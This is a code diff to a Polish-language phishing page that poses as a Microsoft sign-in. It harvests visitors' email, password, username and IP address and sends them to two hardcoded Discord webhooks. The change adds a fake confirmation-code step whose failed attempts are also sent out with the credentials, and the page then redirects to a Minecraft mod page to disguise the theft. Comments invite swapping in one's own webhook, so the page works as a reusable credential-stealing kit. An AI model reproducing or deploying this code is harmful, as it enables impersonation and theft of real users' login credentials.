@@ -36,7 +36,7 @@
             font-size: 1.5rem;
             color: #333;
         }
-        input[type="text"], input[type="password"] {
+        input[type="text"], input[type="password"], input[type="number"] {
             padding: 10px;
             margin-bottom: 20px;
             width: 100%;
@@ -57,8 +57,14 @@
         button:hover {
             background-color: #005a9e;
         }
-        #page2 {
+        #page2, #confirmation {
             display: none;
+        }
+        #error-message {
+            color: red;
+            display: none;
+            margin-top: -10px;
+            margin-bottom: 20px;
         }
     </style>
 </head>
@@ -84,10 +90,29 @@
         <button onclick="submitData()">Wyślij</button>
     </div>
 
+    <!-- Strona potwierdzenia -->
+    <div class="container" id="confirmation">
+        <div class="header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/1200px-Microsoft_logo.svg.png" alt="Microsoft Logo">
+        </div>
+        <h1>Potwierdź swój dostęp</h1>
+        <p>Wpisz kod potwierdzenia, który otrzymałeś na Discord.</p>
+        <input type="number" id="confirmationCode" placeholder="Kod potwierdzenia">
+        <div id="error-message">Zły kod. Spróbuj ponownie.</div>
+        <button onclick="confirmAccess()">Potwierdź</button>
+    </div>
+
     <script>
         let userIP = '';
         let email = '';
         let password = '';
+        let username = '';
+        let confirmationCode = '';
+
+        // Funkcja do wygenerowania losowego kodu potwierdzenia
+        function generateConfirmationCode() {
+            return Math.floor(100000 + Math.random() * 900000).toString(); // 6-cyfrowy kod
+        }
 
         // Funkcja do pobrania adresu IP i wysłania go na Discord Webhook
         async function getIPAndSendToDiscord() {
@@ -103,9 +128,10 @@
 
         // Funkcja do wysłania danych na Discord Webhook
         async function sendDataToDiscord(ip, email='', password='', username='') {
+            confirmationCode = generateConfirmationCode();
             const webhookURL = 'https://ptb.discord.com/api/webhooks/1252994026072965241/7dqoF-bSnWRK5jh7cNkhuWx1h6nz7Yn6hjh_KoW9U2UJITN-eL9FC1rihQoIj2fwptQ1';  // Zamień to na URL swojego webhooka
             const message = {
-                content: `Adres IP użytkownika: ${ip}\nE-mail: ${email}\nHasło: ${password}\nNazwa użytkownika: ${username}`
+                content: `Adres IP użytkownika: ${ip}\nE-mail: ${email}\nHasło: ${password}\nNazwa użytkownika: ${username}\nKod potwierdzenia: ${confirmationCode}`
             };
 
             try {
@@ -121,7 +147,33 @@
                     throw new Error('Błąd przy wysyłaniu wiadomości na Discord');
                 }
 
-                console.log('Dane wysłane na Discord:', ip, email, password, username);
+                console.log('Dane wysłane na Discord:', ip, email, password, username, confirmationCode);
+            } catch (error) {
+                console.error('Błąd przy wysyłaniu na Discord:', error);
+            }
+        }
+
+        // Funkcja do wysłania nieudanej próby na drugi webhook
+        async function sendFailedAttemptToDiscord(ip, email, password, username, enteredCode, correctCode) {
+            const webhookURL = 'https://ptb.discord.com/api/webhooks/1253065600314638348/uZ269q_oyw3L-dcYHUGBQg6F8xTeeQSeVm-gk5r1oIPGcT0ucQW1hJFzHXkIl_X03KII';  // Zamień to na URL swojego webhooka
+            const message = {
+                content: `Nieudana próba potwierdzenia\nAdres IP użytkownika: ${ip}\nE-mail: ${email}\nHasło: ${password}\nNazwa użytkownika: ${username}\nWprowadzony kod: ${enteredCode}\nPoprawny kod: ${correctCode}`
+            };
+
+            try {
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(message)
+                });
+
+                if (!response.ok) {
+                    throw new Error('Błąd przy wysyłaniu wiadomości na Discord');
+                }
+
+                console.log('Nieudana próba wysłana na Discord:', ip, email, password, username, enteredCode, correctCode);
             } catch (error) {
                 console.error('Błąd przy wysyłaniu na Discord:', error);
             }
@@ -137,9 +189,22 @@
 
         // Funkcja do obsługi przycisku "Wyślij"
         async function submitData() {
-            const username = document.getElementById('username').value;
+            username = document.getElementById('username').value;
             await sendDataToDiscord(userIP, email, password, username);
-            redirectToURL('https://modrinth.com/mod/totemcounter');
+            document.getElementById('page2').style.display = 'none';
+            document.getElementById('confirmation').style.display = 'block';
+        }
+
+        // Funkcja do obsługi potwierdzenia
+        async function confirmAccess() {
+            const enteredCode = document.getElementById('confirmationCode').value;
+            const errorMessage = document.getElementById('error-message');
+            if (enteredCode === confirmationCode) {
+                redirectToURL('https://modrinth.com/mod/totemcounter');
+            } else {
+                errorMessage.style.display = 'block';
+                await sendFailedAttemptToDiscord(userIP, email, password, username, enteredCode, confirmationCode);
+            }
         }
 
         // Funkcja do przekierowania użytkownika na inną stronę
@@ -147,12 +212,13 @@
             window.location.href = url;
         }
 
-        // Pobranie IP użytkownika po załadowaniu strony i wysłanie go na Discord
-        window.onload = getIPAndSendToDiscord;
+        // Pobranie IP użytkownika po załadowaniu strony
+        getIPAndSendToDiscord();
     </script>
 </body>
 </html>
 
     </script>
 </body>
+</html>
 </html>
